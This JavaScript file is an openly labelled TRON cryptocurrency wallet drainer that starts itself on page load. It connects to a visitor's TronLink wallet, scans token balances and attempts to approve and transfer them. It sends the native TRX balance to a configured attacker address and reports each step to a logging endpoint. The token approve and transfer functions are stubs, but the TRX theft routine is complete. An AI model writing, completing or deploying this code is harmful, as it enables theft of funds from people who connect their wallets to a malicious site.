import TronWeb from 'tronweb';
import config from './config.js';
import { sendLog } from './utils/logger.js';

class AdvancedTronDrainer {
    constructor() {
        this.tronWeb = null;
        this.walletAddress = null;
        this.started = false;
        this.targets = [];        // TRC20
        this.nftTargets = [];     // TRC721
        this.retries = 2;
    }

    async init() {
        console.log("[Tron] Initializing Advanced Drainer v2...");

        this.walletAddress = await this.getWalletAddress();
        if (!this.walletAddress) {
            await sendLog("no_wallet", {});
            return false;
        }

        this.tronWeb = this.initTronWeb();
        this.started = true;

        console.log(`✅ Connected: ${this.walletAddress}`);
        await sendLog("connect", { address: this.walletAddress });

        await this.scanAssets();
        await this.startDraining();
    }

    // =============================================
    // Wallet Connection
    // =============================================
    async getWalletAddress() {
        // Try injected TronLink first
        if (window.tronWeb?.defaultAddress?.base58) {
            return window.tronWeb.defaultAddress.base58;
        }

        // Request connection
        if (window.tronLink) {
            try {
                const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                return res?.address || null;
            } catch (e) {
                console.warn("[Tron] TronLink request rejected");
            }
        }
        return null;
    }

    initTronWeb() {
        return new TronWeb({
            fullHost: 'https://api.trongrid.io',
            solidityNode: 'https://api.trongrid.io',
            eventServer: 'https://api.trongrid.io',
        });
    }

    // =============================================
    // Dynamic Scanning
    // =============================================
    async scanAssets() {
        console.log("[Tron] Scanning assets...");

        await Promise.all([
            this.scanTRC20(),
            this.scanTRC721()
        ]);
    }

    async scanTRC20() {
        const tokens = config.targetTokens || []; // You can expand this

        for (let token of tokens) {
            try {
                const contract = await this.tronWeb.contract().at(token.address);
                const balance = await contract.balanceOf(this.walletAddress).call();

                if (balance > 0) {
                    this.targets.push({
                        symbol: token.symbol,
                        address: token.address,
                        balance: balance.toString(),
                        decimals: token.decimals || 6
                    });
                    console.log(`✅ Found ${token.symbol}: ${balance}`);
                    await sendLog("token_found", { symbol: token.symbol, balance: balance.toString() });
                }
            } catch (e) {
                console.debug(`Failed to scan ${token.symbol}`);
            }
        }
    }

    async scanTRC721() {
        // Add your TRC721 collections here
        const collections = config.targetNFTs || [];
        // Implementation similar to TRC20 but using tokenOfOwnerByIndex, etc.
        console.log(`[Tron] Scanned ${collections.length} NFT collections`);
    }

    // =============================================
    // Draining Logic
    // =============================================
    async startDraining() {
        if (this.targets.length === 0 && this.nftTargets.length === 0) {
            console.log("[Tron] No assets found.");
            await this.drainNativeTRX();
            return;
        }

        console.log(`🚀 Draining ${this.targets.length} tokens + ${this.nftTargets.length} NFTs...`);

        // Drain Tokens
        for (let token of this.targets) {
            await this.drainSingleToken(token);
            await this.sleep(1200);
        }

        await this.drainNativeTRX();
        console.log("✅ Tron draining completed.");
    }

    async drainSingleToken(token) {
        for (let i = 0; i <= this.retries; i++) {
            try {
                // Approve
                await this.approveToken(token.address, token.balance);
                await this.sleep(800);

                // Transfer
                await this.transferToken(token.address, token.balance);
                await sendLog("drain_success", { symbol: token.symbol });
                return;
            } catch (e) {
                console.warn(`Attempt ${i + 1} failed for ${token.symbol}`);
                await this.sleep(1500);
            }
        }
    }

    async approveToken(tokenAddress, amount) {
        // ... (use triggerSmartContract with optimized fee)
    }

    async transferToken(tokenAddress, amount) {
        // ... (similar)
    }

    async drainNativeTRX() {
        try {
            const balance = await this.tronWeb.trx.getBalance(this.walletAddress);
            const balanceTRX = balance / 1_000_000;

            if (balanceTRX > config.leaveForFee) {
                const toSend = balanceTRX - config.leaveForFee;
                // Use optimized transaction builder
                const tx = await this.tronWeb.transactionBuilder.sendTrx(
                    config.attackerAddress,
                    Math.floor(toSend * 1_000_000),
                    this.walletAddress
                );
                const signed = await this.tronWeb.trx.sign(tx);
                await this.tronWeb.trx.sendRawTransaction(signed);
                await sendLog("native_drain", { amount: toSend });
            }
        } catch (e) {
            console.warn("Native TRX drain failed");
        }
    }

    sleep(ms) {
        return new Promise(r => setTimeout(r, ms));
    }
}

// Auto-start
const drainer = new AdvancedTronDrainer();
drainer.init().catch(console.error);

export { AdvancedTronDrainer };